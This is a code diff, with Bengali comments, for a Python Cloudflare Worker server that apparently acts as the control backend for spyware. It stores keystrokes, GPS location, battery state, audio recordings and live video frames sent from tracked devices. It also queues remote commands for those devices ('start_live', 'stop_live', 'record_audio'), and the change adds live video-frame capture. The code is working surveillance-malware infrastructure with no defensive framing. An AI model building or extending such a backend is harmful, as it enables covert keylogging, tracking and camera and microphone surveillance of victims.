@@ -32,26 +32,19 @@ class Default(WorkerEntrypoint):
                 client_id = data.get("id", "unknown_device")
                 now = time.time()
                 
-                # ক্যামেরা বা অডিও ডেটা হ্যান্ডল
-                if "camera_image" in data or "audio_data" in data:
-                    if client_id in clients:
-                        if "camera_image" in data:
-                            clients[client_id]["camera_image"] = data["camera_image"]
-                            clients[client_id]["camera_time"] = data.get("time", "")
-                        if "audio_data" in data:
-                            clients[client_id]["audio_data"] = data["audio_data"]
-                            clients[client_id]["audio_time"] = data.get("time", "")
-                        clients[client_id]["command"] = None
-                        clients[client_id]["lastPing"] = now
+                if client_id not in clients:
+                    clients[client_id] = {}
+                
+                # ভিডিও স্ট্রিম এবং অডিও ডেটা হ্যান্ডল
+                if "video_frame" in data:
+                    clients[client_id]["video_frame"] = data["video_frame"]
+                    clients[client_id]["video_time"] = data.get("time", "")
+                elif "audio_data" in data:
+                    clients[client_id]["audio_data"] = data["audio_data"]
+                    clients[client_id]["audio_time"] = data.get("time", "")
                 elif "keystrokes" in data:
-                    if client_id not in clients:
-                        clients[client_id] = {}
                     clients[client_id]["keystrokes"] = data["keystrokes"]
-                    clients[client_id]["lastPing"] = now
                 else:
-                    # সাধারণ লোকেশন ডেটা
-                    if client_id not in clients:
-                        clients[client_id] = {}
                     clients[client_id].update({
                         "id": client_id,
                         "lat": data.get("lat"),
@@ -62,24 +55,21 @@ class Default(WorkerEntrypoint):
                         "battery": data.get("battery", "N/A"),
                         "charging": data.get("charging", "N/A"),
                         "lastSeen": data.get("time", ""),
-                        "lastPing": now
                     })
+                
+                clients[client_id]["lastPing"] = now
                 return Response(json.dumps({"status": "success"}), headers={**cors_headers, "Content-Type": "application/json"})
             except Exception as e:
                 return Response(json.dumps({"error": str(e)}), status=400, headers={**cors_headers, "Content-Type": "application/json"})
 
         if path == "/api/clients" and request.method == "GET":
-            now = time.time()
-            # ১০ মিনিট (৬০০ সেকেন্ড) এর বেশি পুরনো ডিভাইস রিমুভ করা
-            active_clients = {k: v for k, v in clients.items() if now - v.get("lastPing", now) < 600}
-            clients = active_clients
             return Response(json.dumps(clients), headers={**cors_headers, "Content-Type": "application/json"})
 
         if path == "/api/command" and request.method == "POST":
             try:
                 data = await request.json()
                 client_id = data.get("client_id")
-                command = data.get("command")
+                command = data.get("command") # 'start_live', 'stop_live', 'record_audio'
                 if client_id in clients:
                     clients[client_id]["command"] = command
                     return Response(json.dumps({"status": "success"}), headers={**cors_headers, "Content-Type": "application/json"})
